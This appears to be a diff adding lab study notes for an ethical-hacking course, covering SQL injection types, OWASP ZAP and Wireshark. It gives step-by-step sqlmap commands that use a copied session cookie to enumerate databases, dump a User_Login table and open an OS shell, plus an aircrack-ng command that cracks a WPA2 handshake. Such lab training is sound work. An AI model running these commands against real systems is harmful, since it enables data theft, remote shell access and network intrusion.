@@ -66,3 +66,52 @@ Launch and scan
 can also use other web application vulnerability scanning tools such as WPScan Vulnerability Database (https://wpscan.com), Codename SCNR (https://ecsypno.com), AppSpider (https://www.rapid7.com), Uniscan (https://github.com) and N-Stalker (https://www.nstalker.com).
 
 
+
+
+SQL injection attacks can be performed using various techniques to view, manipulate, insert, and delete data from an application's database. There are three main types of SQL injection:
+• In-band SQL injection: An attacker uses the same communication channel to perform the attack and retrieve the results
+• Blind/inferential SQL injection: An attacker has no error messages from the system with which to work, but rather simply sends a malicious SQL query to the database
+• Out-of-band SQL injection: An attacker uses different communication channels (such as database email functionality, or file writing and loading functions) to perform the attack and obtain the results
+
+
+Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+Parrot 
+http://site/ login to site , click view profile , inspect q 
+type document.cookie in the lower-left corner of the browser. and copy complete message 
+Run sqlmap -u "http://site.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs command.
+In this query, -u specifies the target URL (the one you noted down in Step#7), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases.
+
+The above query causes sqlmap to enforce various injection techniques on the name parameter of the URL in an attempt to extract the database information of the  website. type y y 
+sqlmap retrieves the databases present in the MSSQL server. It also displays information about the web server OS, web application technology, and the backend DBMS, 
+Run sqlmap -u "http://www.site.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D site --tables command.
+qlmap retrieves the table contents of the site database and displays them, as shown in screenshot.
+need to retrieve the table content of the column User_Login.
+Run sqlmap -u "http://www.movie.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D site -T User_Login --dump command to dump all the User_Login table content.
+sqlmap -u "http://www.site.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell.
+In this query, --os-shell is the prompt for an interactive OS shell.
+Once sqlmap acquires the permission to optimize the machine, it will provide you with the OS shell. Type hostname and press Enter to find the machine name where the site is running.
+sqlmap will retrieve the hostname of the machine on which the target web application is running
+Type TASKLIST and press Enter to view a list of tasks that are currently running on the target system
+
+Detect SQL Injection Vulnerabilities using OWASP ZAP
+
+	• Red Flag: High risk
+	• Orange Flag: Medium risk
+	• Yellow Flag: Low risk
+Blue Flag: Provides details about information disclosure vulnerabilities
+
+Wi-Fi Packet Analysis using Wireshark
+
+
+Wireshark is a network protocol sniffer and analyzer. It lets you capture and interactively browse the traffic running on a target network. Wireshark can read live data from Ethernet, Token-Ring, FDDI, serial (PPP and SLIP), and 802.11 wireless LAN. Npcap is a library that is integrated with Wireshark for complete WLAN traffic analysis, visualization, drill-down, and reporting. Wireshark can be used in monitor mode to capture wireless traffic. 
+
+
+Perform Wireless Attacks
+Crack a WPA2 network using Aircrack-ng
+
+run aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'. Here, the BSSID of the target is 22:7F:AC:6D:E6:8B.
+	• -a is the technique used to crack the handshake, 2=WPA technique.
+	• -b refers to bssid; replace with the BSSID of the target router.
+-w stands for wordlist; provide the path to a wordlist.
+
+
